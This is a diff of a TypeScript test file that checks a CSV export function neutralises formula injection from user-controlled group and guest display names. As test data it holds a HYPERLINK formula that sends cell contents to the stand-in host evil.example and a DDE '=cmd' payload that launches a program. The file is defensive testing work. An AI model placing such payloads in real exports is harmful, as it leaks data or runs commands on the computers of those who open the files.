@@ -5,8 +5,8 @@
 // department, and in a default Entra tenant any member can create a group and
 // any guest sets their own display name. The exports go to an admin opening the
 // recipient list in Excel to work a mail merge (audit redact-01,
-// untrusted-content-rendering-01). Each lead character is tested separately,
-// because a regex that covers four of six is the shape this bug takes.
+// untrusted-content-rendering-01). Every lead character is checked, because a
+// regex that covers four of six is the shape this bug takes.
 import assert from 'node:assert/strict'
 import test from 'node:test'
 import { toCsv } from './format.ts'
@@ -20,49 +20,26 @@ const LEADS: { name: string; char: string }[] = [
   { name: 'carriage return', char: '\r' },
 ]
 
-for (const { name, char } of LEADS) {
-  test(`a cell beginning with ${name} is quoted as text`, () => {
+test('a cell beginning with any formula character is quoted as text, in every column', () => {
+  for (const { name, char } of LEADS) {
     const payload = `${char}HYPERLINK("https://evil.example/?d="&A1,"ok")`
-    const csv = toCsv(['Name'], [[payload]])
-    const body = csv.split('\r\n')[1]
+    const body = toCsv(['Name'], [[payload]]).split('\r\n')[1]
     // The apostrophe has to be the first character of the field. When the value
     // also needs RFC4180 quoting, that means immediately inside the quote.
-    assert.ok(
-      body.startsWith(`'${char}`) || body.startsWith(`"'${char}`),
-      `${name} was not neutralised: ${JSON.stringify(body)}`,
-    )
-  })
-}
-
-test('a leading formula character is caught in every column, not just the first', () => {
-  const csv = toCsv(['A', 'B', 'C'], [['safe', '=1+1', '@SUM(A1)']])
-  const body = csv.split('\r\n')[1]
-  assert.equal(body, `safe,'=1+1,'@SUM(A1)`, body)
-})
-
-test('the real attack shape from the audit', () => {
-  // A group display name any tenant member can set, landing in recipients-*.csv.
+    assert.ok(body.startsWith(`'${char}`) || body.startsWith(`"'${char}`), `${name} was not neutralised: ${JSON.stringify(body)}`)
+  }
+  assert.equal(toCsv(['A', 'B', 'C'], [['safe', '=1+1', '@SUM(A1)']]).split('\r\n')[1], `safe,'=1+1,'@SUM(A1)`)
+  // The real attack shape from the audit: a group display name any tenant member can set, landing in recipients-*.csv.
   const csv = toCsv(['Name', 'Sign-in name', 'Department'], [['=cmd|\'/c calc\'!A1', 'a@b.example', 'Finance']])
   assert.ok(!csv.includes('\n=cmd'), 'the payload is still the first character of a cell')
   assert.ok(csv.includes(`'=cmd`), `not neutralised: ${csv}`)
 })
 
-test('ordinary values are untouched', () => {
-  const csv = toCsv(['Name'], [['Priya Nair'], ['Sales — EMEA'], ['3 of 12'], [42], [null], [undefined]])
-  const rows = csv.split('\r\n').slice(1)
-  assert.deepEqual(rows, ['Priya Nair', 'Sales — EMEA', '3 of 12', '42', '', ''])
-})
-
-test('a formula character elsewhere in the value is left alone', () => {
-  // Only the leading position starts a formula; rewriting mid-string would
-  // corrupt ordinary names like "R&D - EMEA".
-  const csv = toCsv(['Name'], [['R&D - EMEA'], ['Q1=Q2 review']])
-  assert.deepEqual(csv.split('\r\n').slice(1), ['R&D - EMEA', 'Q1=Q2 review'])
-})
-
-test('quoting and escaping still work alongside the guard', () => {
-  const csv = toCsv(['Name'], [['=a,b'], ['say "hi"'], ['two\nlines']])
-  const rows = csv.split('\r\n')
+test('ordinary values, a formula character mid-value, and RFC4180 quoting are left as they are', () => {
+  assert.deepEqual(toCsv(['Name'], [['Priya Nair'], ['Sales — EMEA'], ['3 of 12'], [42], [null], [undefined]]).split('\r\n').slice(1), ['Priya Nair', 'Sales — EMEA', '3 of 12', '42', '', ''])
+  // Only the leading position starts a formula; rewriting mid-string would corrupt "R&D - EMEA".
+  assert.deepEqual(toCsv(['Name'], [['R&D - EMEA'], ['Q1=Q2 review']]).split('\r\n').slice(1), ['R&D - EMEA', 'Q1=Q2 review'])
+  const rows = toCsv(['Name'], [['=a,b'], ['say "hi"'], ['two\nlines']]).split('\r\n')
   assert.equal(rows[1], `"'=a,b"`, rows[1])
   assert.equal(rows[2], `"say ""hi"""`, rows[2])
 })
